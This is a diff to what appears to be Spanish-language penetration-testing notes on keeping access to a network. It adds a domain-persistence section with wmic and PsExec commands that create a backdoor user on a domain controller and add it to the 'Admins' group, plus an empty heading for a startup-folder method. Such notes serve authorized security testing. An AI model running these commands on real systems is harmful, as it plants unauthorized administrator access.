@@ -3,7 +3,24 @@ Mantener el acceso es importante porque los pentest duran dias, no es funcional 
 
 * Siempre borra los accesos o cambios que hayas creado!
 
+## Local Admin:
+
+### Start Up folder:
+
+
+
+
 ## Active Directory:
 
-### Power-tools
+### Domain Dominance:
+Cuando se tiene domain admin, se puede tomar permanencia de diversos formas:
 
+#### Remote Code Exec:
+Agregando un usuario que conozcamos la contraseña para poder ejecutar por CLI conexiones:
+
+- wmic /node:<DomaincontrollerName> process call create "net user /add PiratedProcess Du^^Y01" Here, PiratedProcess and Du^^Y01 are the user ID and password of the planted dummy process on the target user’s DC.
+
+Add the user to the “Admins” group.
+- PsExec.exe \\< DomaincontrollerName> -accepteula net localgroup "Admins" PiratedProcess /add
+
+### Power-tools
